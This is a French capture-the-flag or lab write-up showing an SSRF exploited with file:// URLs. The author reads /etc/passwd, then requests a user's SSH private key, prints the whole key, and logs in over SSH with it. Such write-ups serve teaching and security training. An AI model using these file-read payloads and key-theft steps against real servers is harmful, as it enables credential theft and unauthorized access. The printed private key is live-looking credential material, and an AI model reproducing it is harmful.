# SSRF

## Exploration

On a une barre de recherche, on voit qu'on peut fetch une ressource web
En testant localhost on remarque que la page d'accueil du site s'affiche, ainsi on peut fetch des ressources locales

## file://

On utilise file:// pour essayer de récupérer des ressources locales, avec `file:///etc/passwd` on obtient la liste de tout les utilisateurs
On a au préalable mis la requête dans le repeater de Burpsuite pour éviter de tout retaper et d'avoir une réponse formattée

```passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:104:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
postfix:x:105:114::/var/spool/postfix:/usr/sbin/nologin
avahi:x:106:117:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin
sysadm:x:1000:1000::/home/sysadm:/bin/bash
```

On voit qu'il y a un utilisateur `sysadm` avec un répertoire intéressant `/home/sysadm`

### Vol de clé SSH

On va aller récupérer des potentiels clé SSH qui trainent dans le .ssh de `sysadm`, avec la requête `file:///home/sysadm/.ssh/id_rsa`.
On obtient la clé privé et on la met dans un fichier

id_rsa
```rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
``` 

On défini des permissions élevée sur le fichier de la clé pour éviter l'erreur de sécuritée ssh classique

```bash
chmod 600 id_rsa
```

On se log via ssh
```bash
ssh sysadm@exos -i id_rsa
```